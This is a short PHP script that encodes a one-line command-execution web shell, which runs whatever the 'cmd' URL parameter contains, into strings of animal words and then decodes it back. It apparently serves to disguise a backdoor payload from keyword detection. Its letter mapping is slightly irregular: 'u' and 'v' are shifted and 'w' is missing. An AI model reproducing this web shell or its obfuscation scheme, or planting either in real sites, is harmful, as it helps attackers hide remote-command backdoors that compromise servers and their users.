<?php

$dict = array(
"a" => "ardvark",
"b" => "bat",
"c" => "cat",
"d" => "dog",
"e" => "elk",
"f" => "frog",
"g" => "goat",
"h" => "hog",
"i" => "iguana",
"j" => "jackal",
"k" => "kiwi",
"l" => "lion",
"m" => "mole",
"n" => "newt",
"o" => "olm",
"p" => "pig",
"q" => "quail",
"r" => "rat",
"s" => "seal",
"t" => "tiger",
"u" => "vulture",
"v" => "wasp",
"x" => "xena",
"y" => "yak",
"z" => "zebra",
" " => "space",
"(" => "eats",
")" => "sleeps",
"." => "sneezes",
"[" => "pukes",
"]" => "kills",
"'" => "jumps",
"\"" => "rolls",
";" => "murders",
"=" => "dances",
"\$" => "sprints",
"{" => "giggles",
"}" => "poops",
"_" => "pees",
"<" => "falls",
">" => "vomits",
"?" => "coughs",
"`" => "tick"
);

$input = "if(isset(\$_GET['cmd'])){ echo `{\$_GET['cmd']}`; }";

function encode($string, $array) {
	$output = array();
	for ($c = 0; $c < strlen($string); $c++) {
		$char = substr($string, $c, 1);
		$upper = isUpper($char);
		$char = strtolower($char);
		if (isset($array[$char])) {
			if ($upper) $output[] = strtoupper($array[$char]);
			else $output[] = $array[$char];
		} else {
			$output[] = $char;
		}
	}
	return implode(" ", $output);
}

function decode($string, $array) {
	$output = "";
	$words = explode(" ", $string);
	foreach ($words as $word) {
		$upper = isUpper($word);
		$word = strtolower($word);
		if ($key = array_search($word, $array)) {
			if ($upper) $key = strtoupper($key);
			$output = "{$output}{$key}";
		} else {
			$output = "{$output}{$word}";
		}
	}
	return $output;
}


function isUpper($char) {
	if (strtoupper($char) == $char) return true;
	return false;
}

echo $output = encode($input, $dict);
echo "<br><br>";
echo decode($output, $dict);

$output = $input;

//print "<pre>" . $output . "</pre>";

?>
